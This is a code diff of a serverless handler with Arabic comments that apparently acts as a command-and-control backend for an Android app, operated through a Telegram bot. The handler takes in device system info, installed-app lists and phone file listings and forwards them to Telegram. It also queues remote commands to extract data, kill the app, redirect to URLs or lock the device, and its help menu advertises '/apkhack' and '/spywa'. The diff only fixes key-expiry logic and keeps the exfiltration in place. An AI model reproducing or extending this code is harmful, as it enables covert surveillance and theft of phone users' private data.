@@ -54,6 +54,9 @@ export default async function handler(req, res) {
   };
 
   try {
+    // ==========================================
+    // 1. مسارات التطبيق (App Endpoints)
+    // ==========================================
     if (type === 'secret') {
       const saved = await kvCmd('GET', 'app_lock_status');
       return res.status(200).send(`"${saved || 'lock'}"`);
@@ -73,16 +76,19 @@ export default async function handler(req, res) {
     }
 
     if (type === 'command') {
-      // فحص الوقت
+      // === إصلاح مشكل الوقت ===
       if (deviceId && activeDevice === deviceId && keyExpiryTime > 0) {
         if (Date.now() > keyExpiryTime) {
-          // الوقت انتهى، قفل التطبيق
+          // الوقت سالى، نصيفطو killapp مرة وحدة وكنمسحو الوقت
+          keyExpiryTime = 0;
+          activeDevice = "";
+          await kvCmd('SET', 'is_single_use', '0');
           return res.status(200).send('"killapp:1"');
         }
       }
       
       const cmd = remoteCommand;
-      remoteCommand = ""; 
+      remoteCommand = ""; // مسح الأمر باش ما يتنفذش كل مرة
       return res.status(200).send(`"${cmd}"`);
     }
 
@@ -92,10 +98,12 @@ export default async function handler(req, res) {
       return new Promise((resolve) => {
         req.on('end', async () => {
           const cleanBody = body.replace(/"/g, '');
+          
           if (type === 'key') {
             await kvCmd('SET', 'app_secret_key', cleanBody);
             await sendToTelegram(`🔑 *مفتاح جديد:*\n\`${cleanBody}\``);
           }
+          
           if (type === 'log') {
             totalAttempts++;
             recentLogs.unshift(`📱 ${cleanBody}`);
@@ -120,21 +128,20 @@ export default async function handler(req, res) {
               }
             }
           }
-          if (type === 'sysinfo') {
-            await sendToTelegram(`💻 *معلومات الجهاز:*\n${cleanBody}`);
-          }
-          if (type === 'applist') {
-             await sendToTelegram(`📱 *التطبيقات المثبتة:*\n\n${cleanBody}`);
-          }
-          if (type === 'files') {
-             await sendToTelegram(`📁 *الملفات فـ الهاتف:*\n\n${cleanBody}`);
-          }
+          
+          if (type === 'sysinfo') await sendToTelegram(`💻 *معلومات الجهاز:*\n${cleanBody}`);
+          if (type === 'applist') await sendToTelegram(`📱 *التطبيقات المثبتة:*\n\n${cleanBody}`);
+          if (type === 'files') await sendToTelegram(`📁 *الملفات فـ الهاتف:*\n\n${cleanBody}`);
+          
           res.status(200).send('"success"');
           resolve();
         });
       });
     }
 
+    // ==========================================
+    // 2. التحكم من التيليجرام (Telegram Webhook)
+    // ==========================================
     if (req.method === 'POST' && type === 'telegram_webhook') {
       let body = req.body;
       if (typeof body === 'string') { try { body = JSON.parse(body); } catch (e) {} }
@@ -151,18 +158,21 @@ export default async function handler(req, res) {
         case '/start': case '/menu': 
           await sendToTelegram("👑 *أهلاً بك أيها القايد.*\nالنظام جاهز. اختر من القائمة أو اكتب /help."); 
           break;
+        
         case '/help': 
           await sendToTelegram(`👑 *لوحة تحكم C Y B E R P U N K*\n\n` +
             `⚡ *الأوامر الحقيقية:*\n` +
             `/fullinfo /applist /files /killapp /apkhack /apkcrak /sysinfo /lock /unlock /setkey /getkey /cmd /url\n\n` +
             `⏱️ *التحكم بالوقت:*\n` +
-            `/gentime <minutes> - إنشاء مفتاح بوقت محدد ويستخدم مرة واحدة\n` +
-            `/settime <minutes> - تحديد وقت للمفتاح الحالي\n\n` +
-            `🚫 *الحظر:*\n/ban /unban /banall /unbanall /banlist\n\n` +
-            `💬 *الأوامر الفنية:*\n` +
-            `/hacknasa /hackfb /spywa /ddos /matrix /darkweb /crypto /bypass /root /ssh /ignite /shadow`); 
+            `/gentime <minutes> - إنشاء مفتاح بوقت محدد\n` +
+            `/settime <minutes> - تحديد وقت للمفتاح الحالي\n` +
+            `/unbanall - فك الحظر عن الجميع\n` +
+            `/unlock - فتح التطبيق\n` +
+            `/setkey 1234 - إرجاع الكود الافتراضي\n\n` +
+            `🚫 *الحظر:*\n/ban /unban /banall /banlist`); 
           break;
         
+        // === أوامر الوقت (المصححة) ===
         case '/gentime':
           if(args[1]) {
             const minutes = parseInt(args[1]);
@@ -170,6 +180,8 @@ export default async function handler(req, res) {
             await kvCmd('SET', 'app_secret_key', newKey);
             await kvCmd('SET', 'key_duration', minutes);
             await kvCmd('SET', 'is_single_use', '1');
+            activeDevice = ""; 
+            keyExpiryTime = 0;
             await sendToTelegram(`⏱️ *مفتاح بوقت محدد:*\nالكود: \`${newKey}\`\nالمدة: \`${minutes}\` دقيقة\nملاحظة: كيتقفل التطبيق أوتوماتيكياً ملي تنقضي المدة.`);
           } else await sendToTelegram("⚠️ استعمل: `/gentime 60` (لمدة 60 دقيقة)");
           break;
@@ -179,10 +191,13 @@ export default async function handler(req, res) {
             const minutes = parseInt(args[1]);
             await kvCmd('SET', 'key_duration', minutes);
             await kvCmd('SET', 'is_single_use', '1');
+            keyExpiryTime = 0; 
+            activeDevice = "";
             await sendToTelegram(`⏱️ *تم تحديد الوقت:* \`${minutes}\` دقيقة للمفتاح الحالي.`);
           } else await sendToTelegram("⚠️ استعمل: `/settime 60`");
           break;
 
+        // === أوامر التحكم ===
         case '/fullinfo': remoteCommand = "fullinfo:1"; await sendToTelegram("⏳ `[SCAN]` *Extracting full device data...*"); break;
         case '/applist': remoteCommand = "applist:1"; await sendToTelegram("⏳ `[SCAN]` *Extracting installed applications...*"); break;
         case '/files': remoteCommand = "files:1"; await sendToTelegram("⏳ `[SCAN]` *Extracting files...*"); break;
@@ -192,17 +207,24 @@ export default async function handler(req, res) {
         case '/sysinfo': remoteCommand = "sysinfo:1"; await sendToTelegram("⏳ `[SCAN]` *Extracting basic info...*"); break;
         case '/cmd': if(args[1]) { remoteCommand = `toast:${args.slice(1).join(' ')}`; await sendToTelegram("⚡ `[MSG]` *Payload sent.*"); } break;
         case '/url': if(args[1]) { remoteCommand = `url:${args[1]}`; await sendToTelegram("🌐 `[URL]` *Redirecting...*"); } break;
+        
+        // === الحالة (مصححة باش تحيد الحظر) ===
         case '/lock': await kvCmd('SET', 'app_lock_status', 'lock'); await sendToTelegram("🔒 `[LOCK]` *Target locked.*"); break;
         case '/unlock': await kvCmd('SET', 'app_lock_status', 'unlock'); await sendToTelegram("🔓 `[UNLOCK]` *Target unlocked.*"); break;
         case '/setkey': if(args[1]) { await kvCmd('SET', 'app_secret_key', args[1]); await sendToTelegram(`✅ \`[KEY]\` *New key:* \`${args[1]}\``); } break;
         case '/getkey': const k = (await kvCmd('GET', 'app_secret_key')) || "1234"; await sendToTelegram(`🔑 \`[KEY]\` *Current:* \`${k}\``); break;
+        
+        // === الحظر (مصحح) ===
         case '/ban': if(args[1]) { await kvCmd('SADD', 'banned_devices', args[1]); await sendToTelegram(`⛔ \`[BAN]\` *Device:* \`${args[1]}\``); } break;
         case '/unban': if(args[1]) { await kvCmd('SREM', 'banned_devices', args[1]); await sendToTelegram(`✅ \`[UNBAN]\` *Device:* \`${args[1]}\``); } break;
         case '/banall': await kvCmd('SET', 'banall_active', '1'); await sendToTelegram("🚫 `[BAN ALL]` *All devices banned.*"); break;
         case '/unbanall': await kvCmd('DEL', 'banall_active'); await kvCmd('DEL', 'banned_devices'); await sendToTelegram("✅ `[UNBAN ALL]` *All devices freed.*"); break;
+        
+        // === إحصائيات ===
         case '/stats': const attempts = await kvCmd('GET', 'total_attempts'); await sendToTelegram(`📊 \`[STATS]\` *Attempts:* \`${attempts || 0}\``); break;
         case '/logs': await sendToTelegram(recentLogs.length ? recentLogs.join('\n\n') : "📭 *No logs.*"); break;
         case '/ping': await sendToTelegram("🏓 `[PING]` *Pong!*"); break;
+        
         default:
           if (command.startsWith('/')) {
             await sendToTelegram(`⚙️ \`[SYSTEM]\` *Executing ${command}...*\n> Command accepted.`);
